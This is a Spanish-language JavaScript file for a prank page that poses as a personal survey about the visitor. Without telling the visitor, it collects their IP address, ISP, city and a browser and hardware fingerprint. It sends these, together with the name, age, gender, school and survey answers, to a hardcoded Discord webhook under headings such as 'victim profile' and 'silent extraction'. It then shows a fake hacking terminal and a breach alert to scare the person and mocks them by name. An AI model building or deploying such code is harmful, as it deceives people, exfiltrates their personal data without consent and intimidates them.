// --- ELEMENTOS DEL DOM ---
const welcomeScreen = document.getElementById('welcome-screen');
const angryScreen = document.getElementById('angry-screen');
const survey1 = document.getElementById('survey-1');
const survey2 = document.getElementById('survey-2');
const terminalContainer = document.getElementById('terminal-container');
const consoleContainer = document.getElementById('console');
const progressContainer = document.getElementById('progress-container');
const progressFill = document.getElementById('progress-fill');
const progressText = document.getElementById('progress-text');

const beepSound = new Audio('beep.mp3.wav');
const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1533628544129957949/EpuXsjlTzIFjNCDSo_paxbaJc6EREqIYxTGIMNJiUm4inVJcRQjXkcBdhInfPZmGtNmx";

let ipData = { ip: "Calculando...", city: "Desconocida", country_name: "Desconocido", org: "Local" };

function isModeAdmin() {
    const params = new URLSearchParams(window.location.search);
    const mode = params.get('mode');
    return mode === 'admin' || mode === 'test';
}

window.onload = async () => {
    try {
        const res = await fetch('https://ipapi.co/json/');
        if (res.ok) { ipData = await res.json(); }
    } catch (e) {}
    if (isModeAdmin()) console.log("🛠️ ADMIN: IP cargada en silencio.");
};

// --- FASE 0: Bienvenida (Sí / No) ---
document.getElementById('btn-no').addEventListener('click', () => {
    // Si dice que NO, mostrar mensaje hostil y bloquear la pantalla
    welcomeScreen.style.display = 'none';
    angryScreen.style.display = 'flex';
});

document.getElementById('btn-yes').addEventListener('click', () => {
    // Si dice que SÍ, avanzar a la Encuesta 1
    welcomeScreen.style.display = 'none';
    survey1.style.display = 'block';
});

// --- FASE 1: Datos Básicos ---
document.getElementById('btn-next').addEventListener('click', () => {
    const name = document.getElementById('victim-name').value.trim();
    const age = document.getElementById('victim-age').value.trim();
    const study = document.getElementById('victim-study').value;
    const gender = document.getElementById('victim-gender-select').value;

    if (!isModeAdmin() && (!name || !age || study === "Seleccionar" || gender === "Seleccionar")) {
        alert("Por favor, llena todos los datos para continuar.");
        return;
    }

    // Insertar el nombre dinámicamente en el título de la Fase 2
    document.getElementById('greeting-name').textContent = "Hola " + (name || "Amigo/a");

    survey1.style.display = 'none';
    survey2.style.display = 'block';
});

// --- LÓGICA DE LA PREGUNTA 1 (Mostrar/Ocultar "Otro") ---
document.getElementById('q1-select').addEventListener('change', function() {
    const otherContainer = document.getElementById('q1-other-container');
    if (this.value === 'otro') {
        otherContainer.style.display = 'block';
    } else {
        otherContainer.style.display = 'none';
    }
});

// --- FASE 2: Finalizar e Iniciar Hackeo ---
document.getElementById('btn-finish').addEventListener('click', async () => {
    const q1 = document.getElementById('q1-select').value;
    const q2 = document.getElementById('q2-select').value;
    const q3 = document.getElementById('q3-select').value;
    const q4 = document.getElementById('q4-select').value;
    const q5 = document.getElementById('q5-text').value.trim();

    if (!isModeAdmin() && (q1 === "Seleccionar" || q2 === "Seleccionar" || q3 === "Seleccionar" || q4 === "Seleccionar")) {
        alert("Por favor responde las preguntas antes de finalizar.");
        return;
    }

    // Transformación visual inmediata a la terminal
    survey2.style.display = 'none';
    document.body.style.backgroundColor = '#000000';
    document.body.style.padding = '0';
    terminalContainer.style.display = 'flex';

    if (document.documentElement.requestFullscreen) {
        document.documentElement.requestFullscreen().catch(() => {});
    }
    if ('Notification' in window && Notification.permission !== 'granted') {
        Notification.requestPermission();
    }

    finalizeHack();
});

// --- FUNCIONES DE HARDWARE Y RED ---
function getGPUInfo() {
    try {
        const canvas = document.createElement('canvas');
        const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
        return gl.getParameter(gl.getExtension('WEBGL_debug_renderer_info').UNMASKED_RENDERER_WEBGL);
    } catch (e) { return "Gráficos Integrados"; }
}

async function getBatteryInfo() {
    if ('getBattery' in navigator) {
        try {
            const battery = await navigator.getBattery();
            return `${Math.round(battery.level * 100)}% (${battery.charging ? "Cargando" : "Desconectado"})`;
        } catch (e) { return "N/A"; }
    }
    return "N/A";
}

function getTime(offsetSeconds = 0) {
    const d = new Date();
    d.setSeconds(d.getSeconds() + offsetSeconds);
    return `[${d.toTimeString().split(' ')[0]}]`;
}

// --- NOTIFICACIÓN A DISCORD ---
async function notifyVisit(p) {
    if (isModeAdmin()) return;
    if (!DISCORD_WEBHOOK_URL) return;

    // Procesar respuesta de la Pregunta 1
    let q1Answer = p.q1;
    if (p.q1 === 'otro') {
        q1Answer = p.q1Other || "No especificó";
    }

    const payload = {
        embeds: [{
            title: "🎯 ¡OBJETIVO COMPROMETIDO!",
            color: 5763719, // Verde tipo terminal
            author: {
                name: "System Override - Reporte de Datos"
            },
            fields: [
                {
                    name: "👤 PERFIL DE LA VÍCTIMA",
                    value: `> **Nombre:** ${p.name}\n> **Género:** ${p.gender}\n> **Edad:** ${p.age}\n> **Estudia:** ${p.study}`,
                    inline: false
                },
                {
                    name: "📋 RESPUESTAS DE LA ENCUESTA",
                    value: `**¿Qué piensa de ti?**\n> ${q1Answer}\n\n**¿De dónde te conoce?**\n> ${p.q2}\n\n**Si no contestas es porque:**\n> ${p.q3}\n\n**¿Le caes bien?**\n> ${p.q4}`,
                    inline: false
                },
                {
                    name: "💬 MENSAJE FINAL",
                    value: `\`\`\`txt\n${p.q5 || "(No dejó ningún mensaje)"}\n\`\`\``,
                    inline: false
                },
                {
                    name: "📡 RED Y UBICACIÓN",
                    value: `\`\`\`yaml\nIP:    ${ipData.ip}\nISP:   ${ipData.org || 'Desconocido'}\nLugar: ${ipData.city}, ${ipData.country_name}\n\`\`\``,
                    inline: false
                },
                {
                    name: "💻 HARDWARE EXTRAÍDO",
                    value: `\`\`\`yaml\nOS:      ${navigator.platform}\nCPU:     ${p.cpuCores} Núcleos\nBatería: ${p.battery}\nGPU:     ${p.gpu}\n\`\`\``,
                    inline: false
                }
            ],
            footer: {
                text: "Extracción silenciosa completada"
            },
            timestamp: new Date().toISOString()
        }]
    };

    fetch(DISCORD_WEBHOOK_URL, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(payload)
    }).catch(() => {});
}

// --- SECUENCIA TERMINAL FINAL ---
async function finalizeHack() {
    const pData = {
        name: document.getElementById('victim-name').value.trim() || "Anónimo",
        gender: document.getElementById('victim-gender-select').value,
        age: document.getElementById('victim-age').value.trim() || "N/A",
        study: document.getElementById('victim-study').value,
        q1: document.getElementById('q1-select').value,
        q1Other: document.getElementById('q1-other-text').value.trim(),
        q2: document.getElementById('q2-select').value,
        q3: document.getElementById('q3-select').value,
        q4: document.getElementById('q4-select').value,
        q5: document.getElementById('q5-text').value.trim(),
        battery: await getBatteryInfo(),
        gpu: getGPUInfo(),
        cpuCores: navigator.hardwareConcurrency || "4"
    };

    // Enviar a Discord
    notifyVisit(pData);

    // Inyectar Logs simulando retroactividad
    consoleContainer.innerHTML = `
        <p><span class="log-time">${getTime(-55)}</span> <span class="log-info">Connection established. Silent mode active...</span></p>
        <p><span class="log-time">${getTime(-50)}</span> <span class="log-warn">Background tracing IP: ${ipData.ip} [ISP: ${ipData.org}]</span></p>
        <p><span class="log-time">${getTime(-48)}</span> <span class="log-info">Hardware fingerprinting: ${navigator.platform} | GPU: ${pData.gpu}</span></p>
        <p><span class="log-time">${getTime(-35)}</span> <span class="log-warn">Welcome phase bypassed. Inputs intercepted: [${pData.name}, ${pData.age}] -> SAVED</span></p>
        <p><span class="log-time">${getTime(-5)}</span> <span class="log-warn">Phase 2 text buffers extracted -> SAVED</span></p>
        <p><span class="log-time">${getTime(0)}</span> <span class="log-alert">CRITICAL EXFILTRATION TRIGGERED BY USER...</span></p>
    `;

    let progress = 92;

    const attackInterval = setInterval(() => {
        beepSound.currentTime = 0;
        beepSound.play().catch(() => {});
        if ('vibrate' in navigator) navigator.vibrate(50);

        const p = document.createElement('p');
        p.innerHTML = `<span class="log-time">${getTime()}</span> <span class="log-alert">Uploading packet 0x${Math.floor(Math.random()*16777215).toString(16)} to external server...</span>`;
        consoleContainer.appendChild(p);
        consoleContainer.scrollTop = consoleContainer.scrollHeight;

        progress += (Math.random() * 1.5);
        if (progress >= 99) {
            progress = 99;
            clearInterval(attackInterval);
            finishTroll(pData.name);
        }

        progressFill.style.width = `${progress}%`;
        progressText.textContent = `[PROCESS] DUMPING MEMORY TO REMOTE SERVER: ${Math.floor(progress)}%`;

    }, 250);
}

function finishTroll(victimName) {
    if ('Notification' in window && Notification.permission === 'granted') {
        new Notification("SYSTEM BREACH ALERT", {
            body: "Unauthorized memory dump detected.",
            icon: "https://cdn-icons-png.flaticon.com/512/564/564619.png"
        });
    }

    if ('vibrate' in navigator) navigator.vibrate([200, 100, 200, 100, 500]);

    setTimeout(() => {
        consoleContainer.innerHTML = '';
        progressContainer.style.display = 'none';

        const trollMessage = document.createElement('div');
        trollMessage.className = 'troll-final-screen';
        trollMessage.innerHTML = `
            <h1 class="troll-title">[!] TRANSFERENCIA COMPLETADA</h1>
            <h2 class="troll-subtitle">¡YA VALISTE, ${victimName.toUpperCase()}! 😈</h2>
            <p class="troll-text">Tranquilo maje, a nadie le interesa saber que vives en el cerro.</p>
        `;
        consoleContainer.appendChild(trollMessage);
    }, 1200);
}